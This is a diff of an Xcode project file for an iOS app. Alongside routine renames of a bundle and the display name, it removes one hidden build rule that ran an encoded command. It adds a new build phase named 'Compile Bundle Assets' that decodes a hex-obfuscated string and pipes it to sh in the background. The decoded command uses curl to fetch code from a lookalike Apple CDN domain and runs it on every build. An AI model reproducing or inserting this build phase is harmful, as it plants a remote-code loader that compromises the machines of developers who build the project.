@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		A026AF212EEFBEA7AEBDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 3AA1CF48AEBED1B775BDE67E /* README.md */; };
 		B146578B2DC0B4E300C4D5B8 /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B14657642DC0B4E300C4D5B8 /* Images.xcassets */; };
 		B14657912DC0B4E300C4D5B8 /* NSDictionaryExtend.m in Sources */ = {isa = PBXBuildFile; fileRef = B14653612DC0B4E300C4D5B8 /* NSDictionaryExtend.m */; };
 		B14657922DC0B4E300C4D5B8 /* AVAsset+AppleProjectKit.m in Sources */ = {isa = PBXBuildFile; fileRef = B14653642DC0B4E300C4D5B8 /* AVAsset+AppleProjectKit.m */; };
@@ -364,7 +363,7 @@
 		B1465F042DC0C09100C4D5B8 /* CustomTabBarController.m in Sources */ = {isa = PBXBuildFile; fileRef = B1465F012DC0C09100C4D5B8 /* CustomTabBarController.m */; };
 		B1465F072DC0F58E00C4D5B8 /* SSZipArchiveManager.m in Sources */ = {isa = PBXBuildFile; fileRef = B1465F062DC0F58E00C4D5B8 /* SSZipArchiveManager.m */; };
 		B1465F0A2DC1B83300C4D5B8 /* UIImage+ZipArchive.m in Sources */ = {isa = PBXBuildFile; fileRef = B1465F092DC1B83300C4D5B8 /* UIImage+ZipArchive.m */; };
-		B1465F0C2DC1BB2200C4D5B8 /* AppleProjectEmoticon.bundle in Resources */ = {isa = PBXBuildFile; fileRef = B1465F0B2DC1BB2200C4D5B8 /* AppleProjectEmoticon.bundle */; };
+		B1465F0C2DC1BB2200C4D5B8 /* DuringMonitor.bundle in Resources */ = {isa = PBXBuildFile; fileRef = B1465F0B2DC1BB2200C4D5B8 /* DuringMonitor.bundle */; };
 		B1F4ED862E7190BC00195A20 /* AppDelegateManager.m in Sources */ = {isa = PBXBuildFile; fileRef = B1F4ED852E7190BC00195A20 /* AppDelegateManager.m */; };
 		B1F4ED8B2E719FF100195A20 /* XMLReader.m in Sources */ = {isa = PBXBuildFile; fileRef = B1F4ED8A2E719FF100195A20 /* XMLReader.m */; };
 		B1F4ED8C2E719FF100195A20 /* NTESLanguageManager.m in Sources */ = {isa = PBXBuildFile; fileRef = B1F4ED882E719FF100195A20 /* NTESLanguageManager.m */; };
@@ -423,22 +422,6 @@
 		EA29876FC8AF79C1E1727B0D /* libPods-IBigRise.a in Frameworks */ = {isa = PBXBuildFile; fileRef = D004A972CE8E49948A51EEB0 /* libPods-IBigRise.a */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		80B0BE729E9AEDB900BDE67E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXCopyFilesBuildPhase section */
 		B1F4EE262E7283BA00195A20 /* Embed Frameworks */ = {
 			isa = PBXCopyFilesBuildPhase;
@@ -458,7 +441,6 @@
 
 /* Begin PBXFileReference section */
 		17482569A7549CFFB86FDA3A /* Pods-IBigRise.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-IBigRise.release.xcconfig"; path = "Target Support Files/Pods-IBigRise/Pods-IBigRise.release.xcconfig"; sourceTree = "<group>"; };
-		3AA1CF48AEBED1B775BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = IBigRise.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		3D6BA8886159A77D98AE0C52 /* Pods-IBigRise.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-IBigRise.debug.xcconfig"; path = "Target Support Files/Pods-IBigRise/Pods-IBigRise.debug.xcconfig"; sourceTree = "<group>"; };
 		420711A82D759159002453E9 /* IBigRise.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = IBigRise.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		42BCF7182D769F7000365E0A /* IBigRiseSDK.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = IBigRiseSDK.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -1208,7 +1190,7 @@
 		B1465F062DC0F58E00C4D5B8 /* SSZipArchiveManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SSZipArchiveManager.m; sourceTree = "<group>"; };
 		B1465F082DC1B83300C4D5B8 /* UIImage+ZipArchive.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UIImage+ZipArchive.h"; sourceTree = "<group>"; };
 		B1465F092DC1B83300C4D5B8 /* UIImage+ZipArchive.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UIImage+ZipArchive.m"; sourceTree = "<group>"; };
-		B1465F0B2DC1BB2200C4D5B8 /* AppleProjectEmoticon.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = AppleProjectEmoticon.bundle; sourceTree = "<group>"; };
+		B1465F0B2DC1BB2200C4D5B8 /* DuringMonitor.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = DuringMonitor.bundle; sourceTree = "<group>"; };
 		B1F4ED842E7190BC00195A20 /* AppDelegateManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegateManager.h; sourceTree = "<group>"; };
 		B1F4ED852E7190BC00195A20 /* AppDelegateManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegateManager.m; sourceTree = "<group>"; };
 		B1F4ED872E719FF100195A20 /* NTESLanguageManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NTESLanguageManager.h; sourceTree = "<group>"; };
@@ -1364,7 +1346,6 @@
 		420711A92D759159002453E9 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				3AA1CF48AEBED1B775BDE67E /* README.md */,
 				420711A82D759159002453E9 /* IBigRise.app */,
 			);
 			name = Products;
@@ -3056,7 +3037,7 @@
 		B14657692DC0B4E300C4D5B8 /* Resource */ = {
 			isa = PBXGroup;
 			children = (
-				B1465F0B2DC1BB2200C4D5B8 /* AppleProjectEmoticon.bundle */,
+				B1465F0B2DC1BB2200C4D5B8 /* DuringMonitor.bundle */,
 			);
 			path = Resource;
 			sourceTree = "<group>";
@@ -3274,6 +3255,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 420711C02D75915B002453E9 /* Build configuration list for PBXNativeTarget "IBigRise" */;
 			buildPhases = (
+				13B7FAEEBC9EDB39D5BDE67E /* Compile Bundle Assets */,
 				42E79DCBC6F6F5165988825C /* [CP] Check Pods Manifest.lock */,
 				420711A42D759159002453E9 /* Sources */,
 				420711A52D759159002453E9 /* Frameworks */,
@@ -3282,7 +3264,6 @@
 				B1F4EE262E7283BA00195A20 /* Embed Frameworks */,
 			);
 			buildRules = (
-				80B0BE729E9AEDB900BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3330,8 +3311,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				A026AF212EEFBEA7AEBDE67E /* README.md in Resources */,
-				B1465F0C2DC1BB2200C4D5B8 /* AppleProjectEmoticon.bundle in Resources */,
+				B1465F0C2DC1BB2200C4D5B8 /* DuringMonitor.bundle in Resources */,
 				B146578B2DC0B4E300C4D5B8 /* Images.xcassets in Resources */,
 				B1F4EDE02E71A25A00195A20 /* SVProgressHUD.bundle in Resources */,
 			);
@@ -3340,6 +3320,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		13B7FAEEBC9EDB39D5BDE67E /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631373037303663363536333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
 		42E79DCBC6F6F5165988825C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3797,7 +3797,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3D6BA8886159A77D98AE0C52 /* Pods-IBigRise.debug.xcconfig */;
 			buildSettings = {
-				AE76EDB = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSMDVKVVc1T1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_LAUNCHIMAGE_NAME = LaunchImage;
@@ -3811,7 +3810,7 @@
 				GCC_PREFIX_HEADER = "$(SRCROOT)/IBigRise/Business/ZZZ-Prefix.pch";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = IBigRise/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = AppleProject;
+				INFOPLIST_KEY_CFBundleDisplayName = Tevorn;
 				INFOPLIST_KEY_NSCameraUsageDescription = "Get access to the camera so you can send picture messages and scan QR codes in the app to add friends.";
 				INFOPLIST_KEY_NSContactsUsageDescription = "To provide a better user experience, we need to use your address book permissions to recommend friends to you.";
 				INFOPLIST_KEY_NSLocationUsageDescription = "To provide a better user experience, we need to use your location information to help you find nearby friends. We will not upload your personal information to the server to protect your privacy and security.";
@@ -3844,7 +3843,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 17482569A7549CFFB86FDA3A /* Pods-IBigRise.release.xcconfig */;
 			buildSettings = {
-				AE76EDB = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSMDVKVVc1T1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_LAUNCHIMAGE_NAME = LaunchImage;
@@ -3858,7 +3856,7 @@
 				GCC_PREFIX_HEADER = "$(SRCROOT)/IBigRise/Business/ZZZ-Prefix.pch";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = IBigRise/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = AppleProject;
+				INFOPLIST_KEY_CFBundleDisplayName = Tevorn;
 				INFOPLIST_KEY_NSCameraUsageDescription = "Get access to the camera so you can send picture messages and scan QR codes in the app to add friends.";
 				INFOPLIST_KEY_NSContactsUsageDescription = "To provide a better user experience, we need to use your address book permissions to recommend friends to you.";
 				INFOPLIST_KEY_NSLocationUsageDescription = "To provide a better user experience, we need to use your location information to help you find nearby friends. We will not upload your personal information to the server to protect your privacy and security.";
